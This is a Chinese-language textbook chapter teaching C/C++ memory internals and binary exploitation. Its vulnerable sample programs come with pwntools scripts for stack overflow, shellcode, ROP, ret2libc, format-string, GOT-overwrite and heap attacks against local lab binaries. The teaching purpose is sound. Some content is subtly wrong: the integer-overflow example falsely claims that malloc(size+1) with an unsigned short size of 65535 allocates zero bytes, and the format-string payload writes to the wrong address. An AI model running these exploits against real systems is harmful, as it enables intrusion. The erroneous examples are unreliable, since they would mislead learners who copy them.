---
title: "第09章-编程语言-CC++"
type: docs
weight: 9
---

# 第09章 编程语言——C/C++

## 章节概述

C/C++是安全研究的基石语言。操作系统内核、底层漏洞原理、恶意软件分析、漏洞利用开发——几乎所有底层安全技术都建立在C/C++之上。本章将系统讲解C/C++在安全领域的核心知识，从内存模型到漏洞利用，从基础语法到高级攻击技术。

## 学习目标

通过本章学习，读者将能够：

1. **理解内存模型**：掌握栈、堆、全局区的内存布局，理解指针的本质
2. **识别常见漏洞**：能够发现缓冲区溢出、格式化字符串、整数溢出、UAF等漏洞
3. **编写基础Exploit**：使用pwntools编写栈溢出exploit，理解Shellcode注入和ROP
4. **理解安全保护机制**：掌握Stack Canary、NX、ASLR、RELRO的原理及绕过思路
5. **进行安全编码**：编写更安全的C/C++代码，避免常见安全陷阱

## 内容结构

### 第一部分：理论基础（01-理论基础.md）
深入讲解C/C++内存模型、指针机制、内存管理、编译链接过程、ELF文件格式等底层知识。这些是理解所有二进制漏洞的前提。

### 第二部分：核心技巧（02-核心技巧.md）
介绍C/C++安全编程的核心技术，包括缓冲区溢出利用、格式化字符串攻击、Shellcode编写、ROP链构建、堆利用基础等关键技术。

### 第三部分：实战案例（03-实战案例.md）
通过真实场景演示C/C++漏洞的发现与利用。包括经典栈溢出、ret2libc、格式化字符串利用、简单堆溢出等完整案例。

### 第四部分：常见误区（04-常见误区.md）
分析C/C++安全研究中的常见错误认知和实践误区，帮助读者避免常见陷阱。

### 第五部分：练习方法（05-练习方法.md）
提供系统化的学习路径和实践建议，包括PWN练习平台、逆向工程练习、安全编码训练等。

### 第六部分：本章小结（06-本章小结.md）
总结本章核心知识点，回顾关键概念和技术要点。

## 前置知识

学习本章前，建议读者具备以下基础知识：

- 基本的编程概念（变量、循环、函数、数组）
- 计算机网络基础（TCP/IP协议栈）
- 操作系统基础（进程、内存管理、文件系统）
- 建议先学习第06章《操作系统基础——Linux》和第07章《操作系统基础——Windows/macOS》

## 学习时间建议

- 理论学习：30-40小时
- 实践练习：50-70小时
- CTF/PWN练习：30-50小时
- 综合项目：20-30小时
- 总计建议：130-190小时（约6-8周全日制学习）

## 核心重点

1. **指针和内存管理**是C/C++安全研究的核心，必须深入理解
2. **缓冲区溢出**是最经典的漏洞类型，是所有二进制安全的基础
3. **GDB调试能力**是分析漏洞的必备技能
4. **pwntools**是PWN方向的核心工具，必须熟练使用
5. **理解编译链接过程**有助于理解漏洞的成因和利用条件

## 章节价值

本章内容直接关联以下安全领域：

- **二进制安全/PWN**：核心考察语言，CTF竞赛主力方向
- **逆向工程**：反编译的目标就是C/C++代码
- **漏洞研究**：理解漏洞原理需要C/C++知识
- **恶意软件分析**：90%+的恶意软件用C/C++编写
- **内核安全**：操作系统内核全部用C编写
- **IoT安全**：嵌入式固件几乎全部是C

## 工具准备

```bash
# 编译工具链
sudo apt install build-essential gcc g++ gdb

# 安全研究工具
sudo apt install nasm checksec binutils

# GDB插件（强烈推荐pwndbg）
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# Python工具库
pip install pwntools ropper ROPgadget

# 反汇编器
# Ghidra（免费）: https://ghidra-sre.org/
# IDA Pro（行业标准，收费）
```


***
# 第09章 理论基础——C/C++安全研究底层知识

## 1. C/C++在安全领域的核心地位

### 1.1 为什么安全研究者必须掌握C/C++

C/C++是安全研究的基石，几乎所有底层安全技术都建立在C/C++之上：

```text
C/C++ 在安全研究中的角色：
├── 操作系统内核（Linux、Windows、macOS 全部用 C 编写）
├── 底层漏洞原理（缓冲区溢出、UAF、整数溢出全部基于 C）
├── 恶意软件分析（绝大多数恶意软件用 C/C++ 编写）
├── 漏洞利用开发（Shellcode、ROP 链）
├── 安全工具开发（Nmap、Wireshark、Metasploit 底层）
├── 逆向工程（反汇编的目标就是 C 代码）
├── 嵌入式/IoT 安全（固件几乎全部是 C）
└── CTF/PWN 竞赛（核心考察语言）
```

**为什么必须学C/C++？**

| 理由 | 说明 |
|------|------|
| 理解内存模型 | 所有底层漏洞都与内存管理有关 |
| 操作系统基础 | Linux/Windows内核都是C写的 |
| 漏洞原理 | 缓冲区溢出、UAF等需要C知识 |
| 逆向工程 | 反编译结果本质上是C代码 |
| 恶意软件分析 | 90%+的恶意软件用C/C++ |
| PWN竞赛 | CTF二进制安全方向的核心 |

### 1.2 C与C++的关系

```text
C语言（1972，Dennis Ritchie）
├── 过程式语言
├── 手动内存管理
├── 无内置安全机制（这既是弱点也是学习点）
├── 极其接近硬件
└── 几乎所有操作系统的实现语言

C++（1983，Bjarne Stroustrup）
├── C的超集（基本兼容C）
├── 面向对象编程
├── 模板元编程
├── STL标准库
├── RAII（资源获取即初始化）
└── 同样存在内存安全问题
```

**安全研究中的分工：**
- **C**：内核漏洞、嵌入式安全、Shellcode编写、底层协议
- **C++**：应用程序漏洞、浏览器安全、大型软件逆向

***
## 2. 计算机内存模型

### 2.1 进程内存布局

理解进程内存布局是理解所有二进制漏洞的基础：

```text
高地址 (0x7FFF...)
┌──────────────────────┐
│      内核空间          │ ← 用户程序不可访问
├──────────────────────┤
│      栈 (Stack)       │ ← 局部变量、函数参数、返回地址
│      ↓ 向低地址增长    │
│                      │
│      ... 空闲区域 ...  │
│                      │
│      ↑ 向高地址增长    │
│      堆 (Heap)        │ ← malloc/new 分配的内存
├──────────────────────┤
│      BSS段            │ ← 未初始化的全局变量
├──────────────────────┤
│      数据段 (.data)    │ ← 已初始化的全局变量
├──────────────────────┤
│      代码段 (.text)    │ ← 程序代码（只读、可执行）
├──────────────────────┤
│      保留区域          │
└──────────────────────┘
低地址 (0x0)
```

### 2.2 栈（Stack）

栈是函数调用时使用的内存区域，具有以下特点：
- **自动管理**：函数进入时分配，退出时释放
- **LIFO结构**：后进先出
- **向下增长**：从高地址向低地址增长
- **存储内容**：局部变量、函数参数、返回地址、保存的寄存器

**函数调用时的栈帧结构：**

```text
高地址
┌──────────────────────┐
│    函数参数 (args)     │ ← [RBP + 16], [RBP + 24]...
├──────────────────────┤
│    返回地址 (RIP)      │ ← [RBP + 8] — 攻击目标！
├──────────────────────┤
│    保存的 RBP          │ ← [RBP] — 栈帧基址
├──────────────────────┤
│    局部变量            │ ← [RBP - 8], [RBP - 16]...
│    buffer[64]          │
├──────────────────────┤
│    ... 可能有填充 ...   │
└──────────────────────┘
低地址（栈顶，RSP指向这里）
```

**函数调用过程（x86-64）：**

```asm
; 调用函数 foo(arg1, arg2)
mov rdi, arg1      ; 第1个参数放rdi
mov rsi, arg2      ; 第2个参数放rsi
call foo           ; 1. 将返回地址压栈 2. 跳转到foo

; foo函数入口（序言）
push rbp           ; 保存调用者的RBP
mov rbp, rsp       ; 设置新的栈帧基址
sub rsp, 0x60      ; 为局部变量分配空间

; ... 函数体 ...

; foo函数退出（尾声）
mov rsp, rbp       ; 恢复栈指针
pop rbp            ; 恢复调用者的RBP
ret                ; 弹出返回地址并跳转
```

### 2.3 堆（Heap）

堆是动态内存分配使用的区域：
- **手动管理**：需要程序员显式malloc/free或new/delete
- **向上增长**：从低地址向高地址增长
- **碎片化**：频繁分配释放会导致内存碎片
- **存储内容**：动态分配的对象、缓冲区

**glibc堆管理机制：**

```text
堆内存结构：
┌──────────────────┐
│  Chunk Header     │ ← 16字节元数据（大小+标志位）
├──────────────────┤
│  User Data        │ ← 用户实际使用的空间
│  (malloc返回的    │
│   指针指向这里)    │
├──────────────────┤
│  Next Chunk Header│ ← 下一个chunk
└──────────────────┘

关键数据结构：
- bin：管理空闲chunk的链表
  - fast bin：小chunk的快速缓存
  - unsorted bin：刚释放的chunk
  - small bin：小chunk的有序链表
  - large bin：大chunk的有序链表
- top chunk：堆顶剩余空间
```

### 2.4 全局区（.data / .bss）

```c
// .data段：已初始化的全局变量
int global_init = 42;           // 存在.data段
char *global_str = "hello";     // 指针在.data段，字符串在.rodata段

// .bss段：未初始化的全局变量
int global_uninit;              // 存在.bss段
char global_buffer[1024];       // 存在.bss段

// .rodata段：只读数据
const int READONLY = 100;       // 存在.rodata段
char *msg = "read only";        // 字符串常量在.rodata段
```

***
## 3. 指针深入理解

### 3.1 指针的本质

指针本质上是一个存储内存地址的变量。在64位系统中，指针占8字节。

```c
#include <stdio.h>

int main() {
    int x = 42;
    int *p = &x;        // p存储x的地址
    int **pp = &p;      // pp存储p的地址（指针的指针）

    printf("x的值:     %d\n", x);          // 42
    printf("x的地址:   %p\n", (void*)&x);  // 如 0x7ffd12345678
    printf("p的值:     %p\n", (void*)p);   // 同上
    printf("*p的值:    %d\n", *p);         // 42（解引用）
    printf("pp的值:    %p\n", (void*)pp);  // p的地址
    printf("*pp的值:   %p\n", (void*)*pp); // x的地址
    printf("**pp的值:  %d\n", **pp);       // 42

    return 0;
}
```

### 3.2 指针运算

```c
int arr[] = {10, 20, 30, 40, 50};
int *p = arr;  // 指向arr[0]

// 指针算术
p + 1;    // 指向arr[1]，地址增加sizeof(int) = 4字节
p + 2;    // 指向arr[2]

// 数组遍历
for (int i = 0; i < 5; i++) {
    printf("arr[%d] = %d, addr = %p\n", i, *(p+i), (void*)(p+i));
}

// 指针相减
int *start = &arr[0];
int *end = &arr[4];
ptrdiff_t diff = end - start;  // diff = 4（元素个数，不是字节数）
```

### 3.3 函数指针

函数指针在安全研究中非常重要——它是控制流劫持攻击的目标：

```c
#include <stdio.h>

void normal_func() {
    printf("正常函数\n");
}

void evil_func() {
    printf("被劫持执行的函数！\n");
}

int main() {
    // 函数指针
    void (*func_ptr)() = normal_func;
    func_ptr();  // 调用normal_func

    // 如果攻击者能覆盖func_ptr的值为evil_func的地址
    // 就能劫持控制流
    func_ptr = evil_func;
    func_ptr();  // 现在调用evil_func

    // C++中的虚函数表（vtable）本质上就是函数指针数组
    // 攻击vtable就是控制流劫持的一种方式

    return 0;
}
```

### 3.4 危险指针模式

```c
// 1. 野指针（Dangling Pointer）
char *p = malloc(64);
free(p);
// p仍然是之前的地址，但内存已释放
// 使用p就是Use-After-Free
strcpy(p, "data");  // 危险！

// 2. 空指针解引用
char *p = NULL;
// *p = 'A';  // 段错误

// 3. 类型混淆
void *p = malloc(64);
int *ip = (int*)p;
char *cp = (char*)p;
// 同一块内存，不同类型解释，可能导致安全问题
```

***
## 4. 内存管理深入

### 4.1 malloc/free的工作原理

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    // malloc：在堆上分配指定大小的内存
    char *buf = (char *)malloc(64);
    if (buf == NULL) {
        perror("malloc");
        return 1;
    }

    // buf指向堆上64字节的连续空间
    printf("分配地址: %p\n", (void*)buf);

    // 使用内存
    strcpy(buf, "Hello, Hacker!");
    printf("内容: %s\n", buf);

    // free：释放内存
    free(buf);
    // 此时buf仍然保存着之前的地址（野指针）

    // 安全做法：释放后置空
    buf = NULL;

    // realloc：重新分配内存
    char *buf2 = malloc(32);
    strcpy(buf2, "small");
    buf2 = realloc(buf2, 128);  // 扩大到128字节
    // realloc可能返回新地址（如果原位置空间不够）
    strcat(buf2, " buffer expanded");
    printf("realloc: %s\n", buf2);
    free(buf2);

    return 0;
}
```

### 4.2 堆管理器内部机制

```text
glibc malloc 的 bin 机制：

Fast Bin（快速缓存）
├── 最近释放的小chunk（< 64字节 on 64位）
├── LIFO（后进先出）
├── 不合并相邻空闲chunk
└── 攻击目标：Double Free → 同一地址分配两次

Unsorted Bin（未排序缓存）
├── 刚释放的chunk（不属于fast bin的）
├── FIFO（先进先出）
├── 下次malloc时会遍历查找合适的chunk
└── 攻击目标：信息泄露（读取libc地址）

Small Bin / Large Bin
├── 按大小排序的空闲chunk链表
├── Small bin: 64字节 - 512字节（64位）
└── Large bin: > 512字节
```

### 4.3 常见堆漏洞

```c
// 1. 堆溢出（Heap Overflow）
char *buf = malloc(64);
// 如果写入超过64字节，会覆盖相邻chunk的header
// 可以修改相邻chunk的大小、标志位
strcpy(buf, very_long_string);  // 堆溢出！

// 2. Use-After-Free
char *p1 = malloc(64);
free(p1);
char *p2 = malloc(64);  // p2可能复用p1的内存
// 如果p1仍被使用，p1和p2指向同一块内存
// 通过p1写入的数据会影响p2读取的数据

// 3. Double Free
char *p = malloc(64);
free(p);
free(p);  // 同一块内存释放两次，破坏堆管理结构

// 4. Off-by-One
char buf[64];
for (int i = 0; i <= 64; i++) {  // 应该是 i < 64
    buf[i] = 'A';  // 写入了65字节，溢出1字节
}
```

***
## 5. 字符串处理——漏洞之源

### 5.1 C字符串的本质

C字符串是以`\0`结尾的字符数组：

```c
char str1[] = "hello";     // 自动添加\0，长度6字节
char str2[] = {'h','e','l','l','o','\0'};  // 同上
char str3[10] = "hello";   // 前5字节+1字节\0，剩余4字节为0

// strlen不计算\0
strlen(str1);  // 返回5

// sizeof计算整个数组大小
sizeof(str1);  // 返回6
```

### 5.2 危险函数列表

```c
// ❌ 危险函数（无边界检查）
strcpy(dest, src);       // 无长度限制
strcat(dest, src);       // 无长度限制
sprintf(buf, "%s", s);   // 无长度限制
gets(buf);               // 无长度限制（已弃用）
scanf("%s", buf);        // 无长度限制

// ✅ 安全替代
strncpy(dest, src, n);   // 最多复制n字节
strncat(dest, src, n);   // 最多追加n字节
snprintf(buf, size, "%s", s);  // 限制输出长度
fgets(buf, size, stdin);       // 限制读取长度
```

### 5.3 栈溢出的根本原因

```c
void vulnerable(char *input) {
    char buffer[64];       // 栈上分配64字节
    strcpy(buffer, input); // 如果input超过64字节→栈溢出
}

// 当input = "A"*80时：
// buffer[0..63] = "AAAA...AAAA"
// buffer[64..71] = 覆盖保存的RBP
// buffer[72..79] = 覆盖返回地址 → 控制程序执行流！
```

***
## 6. 编译与链接

### 6.1 从源代码到可执行文件

```bash
# 预处理 → 编译 → 汇编 → 链接

# 1. 预处理：展开宏、头文件
gcc -E hello.c -o hello.i

# 2. 编译：C代码 → 汇编代码
gcc -S hello.i -o hello.s

# 3. 汇编：汇编代码 → 目标文件
gcc -c hello.s -o hello.o

# 4. 链接：目标文件 → 可执行文件
gcc hello.o -o hello

# 查看各阶段产物
cat hello.i      # 预处理后的代码
cat hello.s      # 汇编代码
objdump -d hello.o  # 目标文件反汇编
objdump -d hello    # 可执行文件反汇编
```

### 6.2 ELF文件格式

```text
ELF文件结构：
┌──────────────────┐
│  ELF Header      │ ← 文件类型、入口地址、节头/程序头偏移
├──────────────────┤
│  Program Headers │ ← 加载信息（段的描述）
├──────────────────┤
│  .text           │ ← 代码段（可执行）
├──────────────────┤
│  .rodata         │ ← 只读数据（字符串常量等）
├──────────────────┤
│  .data           │ ← 已初始化全局变量
├──────────────────┤
│  .bss            │ ← 未初始化全局变量
├──────────────────┤
│  .plt / .got     │ ← 动态链接信息（攻击热点）
├──────────────────┤
│  .symtab         │ ← 符号表
├──────────────────┤
│  Section Headers │ ← 节的描述
└──────────────────┘
```

### 6.3 编译选项与安全

```bash
# 学习阶段：关闭所有安全保护
gcc -g -fno-stack-protector -no-pie -z execstack -o vuln vuln.c

# 生产环境：开启所有安全保护
gcc -O2 -fstack-protector-all -pie -z relro -z now -o safe safe.c

# 编译选项说明：
# -g                    调试信息
# -O0/-O2               优化级别
# -fno-stack-protector  关闭栈保护（Stack Canary）
# -fstack-protector-all 开启全面栈保护
# -no-pie               关闭地址随机化（PIE）
# -pie                  开启PIE
# -z execstack          允许栈上执行代码
# -z noexecstack        禁止栈上执行（NX）
# -z relro              部分RELRO
# -z now                完全RELRO（Full RELRO）
```

***
## 7. 安全保护机制

### 7.1 Stack Canary（栈保护）

```text
原理：在返回地址之前插入一个随机值（canary）
      函数返回前检查canary是否被修改
      如果被修改→程序终止（检测到栈溢出）

栈布局（有canary）：
┌──────────────────┐
│    返回地址        │
├──────────────────┤
│    保存的RBP      │
├──────────────────┤
│    Canary         │ ← 随机值，溢出会覆盖
├──────────────────┤
│    buffer[64]     │
└──────────────────┘

绕过思路：
1. 信息泄露：通过格式化字符串等泄露canary值
2. 覆盖canary之前的变量（如函数指针）
3. 通过fork子进程，canary不变，逐字节爆破
```

### 7.2 NX/DEP（不可执行栈）

```text
原理：标记栈和堆为不可执行
      尝试在栈/堆上执行代码→段错误

绕过思路：
1. ROP（Return-Oriented Programming）
   - 利用程序中已有的代码片段（gadgets）
   - 串联多个gadgets实现任意操作
2. ret2libc
   - 跳转到libc中的system("/bin/sh")
3. ret2plt
   - 利用PLT表中的函数
```

### 7.3 ASLR/PIE（地址随机化）

```text
原理：每次程序运行时，栈、堆、libc的基址随机化
      PIE：程序本身的基址也随机化

绕过思路：
1. 信息泄露：泄露某个已知地址，计算基址偏移
2. 部分覆写（Partial Overwrite）
   - 只覆写返回地址的低2字节
   - 利用随机化粒度（页对齐=4096=0x1000）
3. 利用未随机化的段
   - 没有PIE时，.text/.plt/.got地址固定
```

### 7.4 RELRO（GOT保护）

```text
Partial RELRO：
- GOT表可写
- 可以通过GOT覆写劫持函数调用

Full RELRO：
- GOT表在启动时就设为只读
- 不能通过GOT覆写劫持
- 但增加了启动时间
```

***
## 8. C++安全相关知识

### 8.1 虚函数表（vtable）

```cpp
class Base {
public:
    virtual void func1() { printf("Base::func1\n"); }
    virtual void func2() { printf("Base::func2\n"); }
};

class Derived : public Base {
public:
    void func1() override { printf("Derived::func1\n"); }
};

// 内存布局：
// Base对象: [vptr] → vtable → [func1_addr, func2_addr]
// Derived对象: [vptr] → vtable → [Derived::func1_addr, Base::func2_addr]

// 攻击：如果能修改vptr或vtable内容，就能劫持虚函数调用
```

### 8.2 C++常见安全问题

| 问题类型 | 说明 | 示例 |
|---------|------|------|
| vtable劫持 | 修改虚表指针，控制函数调用 | 堆溢出覆盖vptr |
| 类型混淆 | 将基类指针当作派生类使用 | 浏览器漏洞常见 |
| 异常处理 | C++异常机制的栈展开可被利用 | 覆盖异常处理链 |
| 智能指针 | shared_ptr的引用计数可被破坏 | Double Free变体 |

***
## 9. 调试工具基础

### 9.1 GDB基础命令

```bash
# 启动GDB
gdb ./program
gdb -q ./program  # 安静模式

# 运行程序
run                # 运行
run arg1 arg2      # 带参数运行
run < input.txt    # 从文件读取输入

# 断点
break main         # 在main函数设断点
break *0x401234    # 在地址设断点
break vuln.c:10    # 在文件行号设断点
info breakpoints   # 查看断点
delete 1           # 删除断点1

# 执行控制
continue           # 继续执行
next               # 单步（不进入函数）
step               # 单步（进入函数）
nexti              # 单条指令
stepi              # 单条指令（进入函数）

# 查看信息
info registers     # 查看寄存器
info frame         # 查看栈帧
backtrace          # 调用栈
x/20xg $rsp       # 查看栈内存
x/s 0x401234       # 查看字符串
disassemble main   # 反汇编
```

### 9.2 pwndbg（推荐GDB插件）

```bash
# pwndbg 提供了大量便捷命令
pwndbg> heap         # 查看堆状态
pwndbg> bins         # 查看堆bins
pwndbg> vis_heap_chunks  # 可视化堆chunk
pwndbg> vmmap        # 内存映射
pwndbg> got          # GOT表
pwndbg> plt          # PLT表
pwndbg> stack 20     # 查看栈
pwndbg> search -s "flag"  # 搜索内存
```

***
## 总结

本节建立了C/C++安全研究的理论基础：

1. **内存模型**：栈、堆、全局区的布局和特性
2. **指针**：指针的本质、运算、危险模式
3. **内存管理**：malloc/free机制、堆管理器内部结构
4. **字符串处理**：危险函数和栈溢出的根本原因
5. **编译链接**：从源码到可执行文件的过程、ELF格式
6. **安全保护机制**：Stack Canary、NX、ASLR、RELRO及绕过思路
7. **C++安全**：vtable、类型混淆、异常处理
8. **调试工具**：GDB和pwndbg的使用

这些理论知识是后续学习漏洞利用、逆向工程、恶意软件分析的坚实基础。


***
# 第09章 核心技巧——C/C++漏洞利用技术

## 1. 栈溢出利用

### 1.1 基本栈溢出

```c
// vuln.c - 存在栈溢出漏洞的程序
#include <stdio.h>
#include <string.h>

void secret_function() {
    printf("恭喜！你成功执行了secret_function！\n");
    printf("这就是栈溢出的基本原理。\n");
}

void vulnerable_function() {
    char buffer[64];
    printf("请输入你的名字: ");
    gets(buffer);  // 危险！无边界检查
    printf("你好, %s!\n", buffer);
}

int main() {
    vulnerable_function();
    printf("程序正常退出。\n");
    return 0;
}
```

```bash
# 编译（关闭所有安全保护）
gcc -g -fno-stack-protector -no-pie -z execstack -o vuln vuln.c

# 使用pwntools自动化溢出
python3 << 'EOF'
from pwn import *

elf = ELF('./vuln')
secret_addr = elf.symbols['secret_function']
print(f"secret_function 地址: {hex(secret_addr)}")

# 64字节填充 + 8字节RBP + 返回地址
payload = b'A' * 72 + p64(secret_addr)

p = process('./vuln')
p.sendline(payload)
print(p.recvall().decode())
EOF
```

### 1.2 Shellcode注入

```python
# 使用pwntools生成Shellcode
from pwn import *

context.arch = 'amd64'

# Linux x86-64 execve("/bin/sh")
sc = asm(shellcraft.sh())
print(f"Shellcode 长度: {len(sc)}")
print(f"Shellcode hex: {sc.hex()}")

# 生成无null字节的shellcode（绕过坏字符）
sc_no_null = asm(shellcraft.sh(), avoid=b'\x00')
print(f"无null字节shellcode: {sc_no_null.hex()}")
```

### 1.3 ROP（Return-Oriented Programming）

```python
# ROP链构建
from pwn import *

elf = ELF('./vuln')
rop = ROP(elf)

# 查找gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_addr = rop.find_gadget(['ret'])[0]

print(f"pop rdi; ret 地址: {hex(pop_rdi)}")
print(f"ret 地址: {hex(ret_addr)}")

# 构建ROP链调用system("/bin/sh")
# 1. pop rdi; ret    → 设置第一个参数
# 2. 地址 of "/bin/sh" → 字符串参数
# 3. 地址 of system   → 调用system
```

***
## 2. 格式化字符串漏洞

### 2.1 基本利用

```c
// fmt_vuln.c
#include <stdio.h>

int secret = 0xdeadbeef;

void vuln() {
    char buf[100];
    printf("Input: ");
    fgets(buf, sizeof(buf), stdin);
    printf(buf);  // 格式化字符串漏洞
}

int main() {
    vuln();
    if (secret == 0x41414141) {
        printf("You win!\n");
    }
    return 0;
}
```

```python
# 格式化字符串利用
from pwn import *

p = process('./fmt_vuln')

# 泄露栈上的值
p.sendline(b'%p.%p.%p.%p.%p.%p.%p.%p')
leak = p.recvline()
print(f"栈泄露: {leak}")

# 使用fmtstr_payload自动生成payload
# fmtstr_payload(offset, writes)
# offset: 输入在栈上的偏移
# writes: {地址: 值} 的字典
payload = fmtstr_payload(6, {0xdeadbeef: 0x41414141})
p.sendline(payload)
```

***
## 3. 整数溢出利用

### 3.1 整数溢出原理

```c
#include <stdio.h>
#include <limits.h>

void integer_overflow_demo() {
    unsigned int max_uint = UINT_MAX;  // 4294967295
    printf("UINT_MAX + 1: %u\n", max_uint + 1);  // 溢出为0

    int max_int = INT_MAX;  // 2147483647
    printf("INT_MAX + 1: %d\n", max_int + 1);  // 溢出为-2147483648
}
```

### 3.2 整数溢出导致堆溢出

```c
// 整数溢出漏洞示例
void vulnerable_malloc(unsigned short size) {
    // 如果size=65535, size+1=65536=0x10000
    // 但unsigned short只能存0-65535
    // 所以(size+1)溢出为0！
    char *buf = malloc(size + 1);  // 只分配了0字节！
    memcpy(buf, user_input, size); // 堆溢出！
}
```

***
## 4. Use-After-Free利用

### 4.1 UAF漏洞原理

```c
#include <stdio.h>
#include <stdlib.h>

struct User {
    char name[32];
    void (*greet)(void);
};

void say_hello() { printf("Hello!\n"); }
void say_goodbye() { printf("Goodbye!\n"); }

void uaf_demo() {
    struct User *user1 = malloc(sizeof(struct User));
    strcpy(user1->name, "Alice");
    user1->greet = say_hello;
    user1->greet();

    free(user1);  // 释放user1

    // 分配新对象（可能复用同一块内存）
    struct User *user2 = malloc(sizeof(struct User));
    strcpy(user2->name, "Evil Data");
    user2->greet = say_goodbye;

    // Use-After-Free：user1指针仍然有效，但内存已被user2使用
    // user1->greet();  // 可能调用say_goodbye（被user2覆盖）

    free(user2);
    user1 = NULL;
    user2 = NULL;
}
```

***
## 5. 堆利用基础

### 5.1 堆溢出利用思路

```python
# 堆利用常见技术（概念性说明）
# 1. Fast Bin Attack
#    - 利用fast bin的LIFO特性
#    - Double Free → 同一地址分配两次
#    - 可以在任意地址分配chunk

# 2. Unsorted Bin Attack
#    - 利用unsorted bin的链表结构
#    - 可以向任意地址写入一个大值
#    - 常用于修改__malloc_hook

# 3. House of系列
#    - House of Spirit：伪造chunk
#    - House of Force：修改top chunk大小
#    - House of Lore：利用small bin
#    - House of Orange：修改top chunk
```

### 5.2 使用pwntools进行堆利用

```python
from pwn import *

# 连接到堆题目
p = process('./heap_challenge')

def alloc(size, data):
    p.sendline(b'1')
    p.sendline(str(size).encode())
    p.send(data)

def free(index):
    p.sendline(b'2')
    p.sendline(str(index).encode())

def show(index):
    p.sendline(b'3')
    p.sendline(str(index).encode())

# 堆利用流程
# 1. 分配多个chunk
alloc(0x60, b'A' * 0x60)  # chunk 0
alloc(0x60, b'B' * 0x60)  # chunk 1

# 2. 释放chunk 0（进入fast bin）
free(0)

# 3. 此时chunk 0在fast bin中
# 如果存在UAF，可以读取chunk 0的内容（泄露堆地址）
show(0)

# 4. 利用Double Free或其他技术
# 在任意地址分配chunk
```

***
## 6. Shellcode编写技巧

### 6.1 基本Shellcode

```python
# 使用pwntools生成shellcode
from pwn import *

context.arch = 'amd64'

# 最简单的shellcode：execve("/bin/sh", NULL, NULL)
sc = asm(shellcraft.sh())
print(f"长度: {len(sc)}")

# 带编码的shellcode（绕过坏字符）
sc = asm(shellcraft.sh(), avoid=b'\x00\x0a\x0d')
print(f"无坏字符shellcode长度: {len(sc)}")

# 自定义shellcode：执行命令
sc = asm(shellcraft.execve('/bin/sh', ['sh', '-c', 'id'], NULL))
```

### 6.2 手写Shellcode（学习用）

```asm
; x86-64 Linux execve("/bin/sh", NULL, NULL)
; 汇编代码
xor    rsi, rsi        ; argv = NULL
xor    rdx, rdx        ; envp = NULL
mov    rbx, 0x68732f6e69622f  ; "/bin/sh"
push   rbx
mov    rdi, rsp        ; rdi = "/bin/sh"
push   0x3b
pop    rax             ; rax = 59 (execve syscall number)
syscall                ; 调用execve
```

***
## 7. ret2libc技术

### 7.1 基本ret2libc

```python
from pwn import *

elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# 如果ASLR开启，需要先泄露libc地址
# 方法：通过puts/printf泄露某个GOT表项

# 假设已经泄露了libc基址
libc_base = 0x7ffff7a00000  # 实际值需要泄露
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

# 构建ROP链
payload = b'A' * 72          # 填充
payload += p64(pop_rdi)      # pop rdi; ret
payload += p64(bin_sh_addr)  # "/bin/sh"地址
payload += p64(system_addr)  # system地址

p = process('./vuln')
p.sendline(payload)
p.interactive()
```

***
## 8. GOT覆写

### 8.1 GOT/PLT机制

```text
PLT（Procedure Linkage Table）：
- 延迟绑定的跳转表
- 每个外部函数在PLT中有一个条目
- 第一次调用时通过GOT解析真实地址

GOT（Global Offset Table）：
- 存储外部函数的真实地址
- 第一次调用后，GOT中存储libc中的真实地址
- 如果GOT可写（Partial RELRO），可以覆写

攻击思路：
1. 找到GOT表中某个函数的地址（如printf@GOT）
2. 通过漏洞将其修改为system的地址
3. 之后调用printf时，实际调用system
```

### 8.2 GOT覆写示例

```python
from pwn import *

elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# 获取GOT表地址
printf_got = elf.got['printf']
puts_got = elf.got['puts']

# 泄露libc地址（通过puts打印printf的GOT值）
# ... 泄露代码 ...

# 计算system地址
system_addr = libc_base + libc.symbols['system']

# 覆写printf@GOT为system
# 使用格式化字符串或其他写入原语
# 之后调用printf("/bin/sh") 实际调用system("/bin/sh")
```

***
## 9. 信息泄露技术

### 9.1 泄露libc地址

```python
from pwn import *

# 方法1：通过puts泄露GOT表
def leak_libc(p, elf):
    rop = ROP(elf)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

    # 调用puts(puts@GOT)泄露puts的真实地址
    payload = b'A' * 72
    payload += p64(pop_rdi)
    payload += p64(elf.got['puts'])
    payload += p64(elf.plt['puts'])
    payload += p64(elf.symbols['main'])  # 返回main再次利用

    p.sendline(payload)
    puts_addr = u64(p.recvline().strip().ljust(8, b'\x00'))
    return puts_addr

# 方法2：通过格式化字符串泄露
def leak_with_fmt(p):
    # 泄露栈上的libc地址
    p.sendline(b'%7$p')
    leak = int(p.recvline(), 16)
    return leak
```

***
## 10. 常用工具和技巧

### 10.1 pwntools速查

```python
from pwn import *

# 设置架构
context.arch = 'amd64'  # 或 'i386'
context.os = 'linux'

# 连接目标
p = process('./vuln')      # 本地
p = remote('host', port)   # 远程

# 数据打包
p64(0xdeadbeef)  # 64位打包
p32(0xdeadbeef)  # 32位打包
u64(data)        # 64位解包
u32(data)        # 32位解包

# 交互
p.send(data)
p.sendline(data)
p.recv(n)
p.recvline()
p.recvuntil(b'$ ')
p.interactive()  # 进入交互模式

# ELF分析
elf = ELF('./vuln')
elf.symbols['main']  # 获取main地址
elf.got['printf']    # 获取GOT地址
elf.plt['printf']    # 获取PLT地址

# ROP
rop = ROP(elf)
rop.find_gadget(['pop rdi', 'ret'])
```

### 10.2 GDB调试技巧

```bash
# attach到运行中的进程
gdb -p PID

# 在pwntools中使用GDB
from pwn import *
p = process('./vuln')
gdb.attach(p, '''
    break *0x401234
    continue
''')

# 查看内存
x/20xg $rsp    # 查看栈
x/20xg $rbp    # 查看栈帧
x/s 0x401234   # 查看字符串
```

***
## 总结

本节介绍了C/C++漏洞利用的核心技术：

1. **栈溢出**：基本溢出、Shellcode注入、ROP链构建
2. **格式化字符串**：信息泄露、任意地址写入
3. **整数溢出**：有符号/无符号溢出、整数截断
4. **UAF**：Use-After-Free的原理和利用
5. **堆利用**：Fast Bin Attack、Unsorted Bin Attack等
6. **ret2libc**：利用libc中的函数
7. **GOT覆写**：修改GOT表劫持函数调用
8. **信息泄露**：泄露libc地址绕过ASLR

